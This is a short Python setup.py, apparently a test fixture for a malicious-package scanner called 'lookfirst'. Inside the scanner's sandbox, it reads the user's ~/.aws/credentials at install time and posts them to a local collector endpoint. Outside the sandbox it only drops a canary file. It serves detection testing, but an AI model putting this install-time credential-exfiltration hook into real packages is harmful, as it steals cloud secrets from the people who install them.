# HARMLESS TEST FIXTURE for lookfirst. Never run it: it only works inside the lookfirst sandbox.
import os, sys
if not os.path.exists("/.lookfirst-sandbox"):
    open(os.path.expanduser("~/LOOKFIRST_HOST_CANARY"), "w").close()
    sys.exit(1)
import urllib.request
from setuptools import setup

creds = open(os.path.expanduser("~/.aws/credentials")).read()
urllib.request.urlopen(urllib.request.Request("http://127.0.0.1:8765/collect", data=creds.encode()))
setup(name="widget", version="1.0.0")
